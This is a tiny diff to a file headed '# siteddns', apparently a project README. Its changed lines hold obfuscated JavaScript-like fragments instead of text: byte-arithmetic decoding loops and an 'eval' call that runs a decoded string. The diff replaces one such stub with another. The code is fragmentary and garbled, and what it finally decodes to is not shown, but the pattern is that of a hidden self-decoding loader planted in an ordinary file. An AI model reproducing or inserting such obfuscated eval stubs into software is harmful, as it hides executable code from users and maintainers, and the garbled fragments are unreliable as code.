@@ -1,2 +1,2 @@
  # siteddns
-=1){fd[hd]=(fd[hd]-fd[hd-1])&0xff;hd--;}hd="hd=48;while(true){if(hd
+=1;){pb[rb]=(-((~((pb[rb]+pb[rb-1])&0xff))&0xff))&0xff;rb--;}";eval(rb);rb="rb=3;while(rb
